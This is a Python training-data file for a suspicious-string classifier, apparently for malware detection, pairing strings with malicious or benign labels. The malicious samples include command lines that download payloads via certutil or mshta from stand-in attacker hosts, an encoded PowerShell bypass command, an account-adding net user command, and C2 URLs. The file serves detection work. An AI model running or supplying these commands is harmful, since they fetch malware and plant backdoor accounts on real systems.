"""
Labelled string training dataset.
Format: (string_value, is_suspicious: bool)

Guidelines for adding new samples:
  - If you are unsure whether a string is malicious, do NOT add it.
  - Aim for a balanced dataset (roughly 50/50 malicious vs benign).
  - Add obfuscated variants in Phase 2 once base accuracy is > 90%.
"""

training_samples = [
    # ─── MALICIOUS (True) ─────────────────────────────────────────────────────

    # Network / C2 indicators
    ("http://185.220.101.5:4444/payload.exe", True),
    ("http://malicious-c2-domain.xyz/stage2.bin", True),
    ("https://pastebin.com/raw/d34db33f", True),
    ("http://192.168.1.100:8080/beacon", True),
    ("ftp://attacker.top/shell.exe", True),

    # Process Injection APIs
    ("VirtualAllocEx", True),
    ("WriteProcessMemory", True),
    ("CreateRemoteThread", True),
    ("QueueUserAPC", True),
    ("NtMapViewOfSection", True),
    ("SetThreadContext", True),
    ("RtlCreateUserThread", True),

    # Evasion / Anti-analysis
    ("IsDebuggerPresent", True),
    ("CheckRemoteDebuggerPresent", True),
    ("NtQueryInformationProcess", True),
    ("SetWindowsHookEx", True),
    ("GetAsyncKeyState", True),

    # Credential theft
    ("MiniDumpWriteDump", True),
    ("AdjustTokenPrivileges", True),
    ("LookupPrivilegeValue", True),

    # Persistence
    ("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater", True),
    ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\svchost", True),

    # Execution / LOLBins
    ("powershell.exe -ExecutionPolicy Bypass -enc JABjAD0A", True),
    ("cmd.exe /c net user hacker Password1! /add", True),
    ("certutil.exe -urlcache -split -f http://evil.com/malware.exe", True),
    ("mshta.exe http://attacker.xyz/vbs/payload.hta", True),
    ("rundll32.exe shell32.dll,ShellExec_RunDLL", True),

    # Sensitive system paths
    ("%TEMP%\\dropper_stage2.exe", True),
    ("C:\\Users\\Public\\AppData\\Roaming\\stealer.dll", True),
    ("C:\\Windows\\System32\\lsass.exe", True),

    # Obfuscated / Encoded
    ("aHR0cHM6Ly9hdHRhY2tlci5jb20vc2hlbGxjb2RlLmJpbg==", True),  # base64 URL
    ("JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA=", True),  # PowerShell cradle
    ("TVqQAAMAAAAEAAAA//8AALgAAAAA", True),                          # base64 MZ header

    # ─── BENIGN (False) ───────────────────────────────────────────────────────

    # CRT / Standard library noise
    ("bad allocation", False),
    ("std::exception", False),
    ("vector<T> too long", False),
    ("string too long", False),
    ("CorExitProcess", False),
    ("mscoree.dll", False),
    ("GetProcessHeap", False),
    ("HeapAlloc", False),
    ("HeapFree", False),

    # Standard Windows APIs (expected in most benign binaries)
    ("GetLastError", False),
    ("SetLastError", False),
    ("GetModuleHandleA", False),
    ("GetModuleHandleW", False),
    ("GetProcAddress", False),
    ("LoadLibraryA", False),
    ("LoadLibraryW", False),
    ("ExitProcess", False),
    ("KERNEL32.dll", False),
    ("USER32.dll", False),
    ("ADVAPI32.dll", False),
    ("ntdll.dll", False),

    # Generic strings commonly found in legitimate software
    ("This program cannot be run in DOS mode", False),
    ("Microsoft Visual C++ Runtime Library", False),
    ("Runtime Error", False),
    ("Program Files", False),
    ("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", False),
    ("http://schemas.microsoft.com/winfx", False),
    ("https://support.microsoft.com", False),
    ("https://update.microsoft.com", False),
    ("C:\\Windows\\System32\\ntdll.dll", False),
    ("C:\\Windows\\SysWOW64\\kernel32.dll", False),
    ("GetNativeSystemInfo", False),
    ("IsWow64Process", False),
    # Legitimate URLs from known safe software
    ("https://www.google.com/help", False),
    ("https://update.microsoft.com/windowsupdate", False),
    ("https://schemas.microsoft.com/winfx/2006", False),
    ("http://schemas.xmlsoap.org/soap/envelope", False),
    ("https://go.microsoft.com/fwlink/?linkid=", False),
    ("https://support.microsoft.com/kb", False),
    ("https://docs.microsoft.com/en-us/", False),

    # Benign registry keys
    ("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Fonts", False),
    ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", False),
    ("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", False),
    ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\notepad.exe", False),
]
